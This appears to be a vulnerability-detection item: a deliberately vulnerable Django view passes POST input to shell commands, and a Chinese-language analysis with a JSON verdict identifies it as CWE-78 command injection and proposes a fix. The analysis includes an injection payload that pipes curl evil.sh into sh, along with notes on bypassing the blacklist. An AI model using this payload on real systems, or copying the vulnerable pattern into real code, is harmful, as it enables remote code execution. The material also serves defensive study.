@@ -1,0 +1,67 @@
+LANG: python
+```code
+import json
+import re
+import subprocess
+
+from django.http import JsonResponse
+from django.views.decorators.http import require_POST
+
+
+FFMPEG_PREFIXES = ('ffmpeg', '/usr/bin/ffmpeg', '/bin/ffmpeg')
+
+
+def sanitize_ffmpeg_command(command):
+    # blacklist-style filtering, same bypassable design as the original
+    command = command.replace('&&', '')
+    command = re.sub(r'\s*&?>.*(?:2>&1)?', '', command)
+    command = re.sub(r'[;|`<>$()
+\r{}]', '', command)
+    stripped = command.strip()
+    if any(stripped.startswith(p) for p in FFMPEG_PREFIXES):
+        return command
+    return ''
+
+
+@require_POST
+def ffmpeg_control(request):
+    action = request.POST.get('action', '')
+
+    if action == 'list':
+        keyword = request.POST.get('keyword', '')
+        cmd = "ps -eo pid,etime,%cpu,%mem,cmd | grep '[f]fmpeg'"
+        if keyword:
+            cmd += " | grep '" + keyword + "'"
+        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        return JsonResponse({'output': proc.stdout.splitlines()})
+
+    if action == 'kill':
+        pid = request.POST.get('pid', '')
+        if not pid.isdigit():
+            return JsonResponse({'error': True, 'msg': 'Invalid PID'}, status=400)
+        kill_cmd = 'kill -9 ' + pid
+        subprocess.run(kill_cmd, shell=True)
+        return JsonResponse({'error': False, 'msg': f'Process {pid} killed'})
+
+    if action == 'start':
+        raw_command = request.POST.get('command', '')
+        safe_command = sanitize_ffmpeg_command(raw_command)
+        if not safe_command:
+            return JsonResponse({'error': True, 'msg': 'Sanitization failed'}, status=400)
+        subprocess.Popen(safe_command, shell=True,
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return JsonResponse({'error': False, 'msg': 'started'})
+
+    return JsonResponse({'error': True, 'msg': 'Unknown action'}, status=400)
+```
+
+分析：
+1. 第 39 行 `request.POST.get('keyword')`、第 48 行 `request.POST.get('pid')`、第 55 行 `request.POST.get('command')` 是全部外部输入点（source），均来自 POST 表单，攻击者完全可控。
+2. 数据流一：第 40-42 行 keyword 直接字符串拼接进 `cmd`，仅用单引号包裹，未做任何转义；第 44 行 `subprocess.run(cmd, shell=True)` 是 sink。注入 `' ; curl evil.sh | sh` 即可闭合引号执行任意命令——无有效防御。
+3. 数据流二：第 56-57 行 `sanitize_ffmpeg_command` 采用黑名单/正则删除 `;|`$(){} 等字符并要求前缀为 ffmpeg。与原漏洞相同，黑名单可绕过：例如利用 ffmpeg 自身参数或编码变体（如通过环境变量展开、换行外的其他分隔方式、或利用未被过滤的 `&` 单个字符后台拼接）仍可改变命令语义；且删除式过滤不等于白名单校验。第 58-59 行 `subprocess.Popen(safe_command, shell=True)` 为 sink。
+4. 数据流三：kill 分支第 49-50 行用 `isdigit()` 校验后拼接，是三条流中唯一有类型级防御的，但 `shell=True` 仍非必要；该分支本身风险较低。
+5. 第二入口确认：同一视图存在 list/kill/start 三条路由参数通道，start 与 list 均可达 shell sink；此外任何复用 `sanitize_ffmpeg_command` 的间接调用同样继承可绕过缺陷。综合结论：存在 CWE-78 OS 命令注入，主链为 start 分支。
+
+```json
+{"has_vulnerability": true, "vulnerability_type": "CWE-78 OS Command Injection", "risk_level": "Critical", "source": "line 55: request.POST.get('command') 以及 line 39: request.POST.get('keyword')", "sink": "line 59: subprocess.Popen(safe_command, shell=True) 与 line 44: subprocess.run(cmd, shell=True)", "explanation": "数据流一: line 39 keyword 未过滤直接拼入 ps/grep 命令, 单引号包裹可被闭合, 到达 line 44 shell=True 执行任意命令; 数据流二: line 55 command 经 sanitize_ffmpeg_command 黑名单正则删除特殊字符并检查前缀, 该防御为黑名单式可绕过(如残留的单个 & 后台拼接、前缀合法但后续参数注入), 到达 line 59 shell=True 执行; 数据流三: line 48 pid 有 isdigit 类型校验, 风险较低但仍使用 shell=True; 第二入口: 同一视图的 list 与 start 两条 action 参数均为独立可达 sink 的通道, 复用 sanitize 函数的其他调用点同样继承缺陷", "fix_suggestion": "line 44/59: 改用 subprocess.run(cmd_list, shell=False) 参数列表形式执行, 对 grep 关键字与 ffmpeg 参数逐项作为 argv 元素传递, 移除 shell=True"}
+```
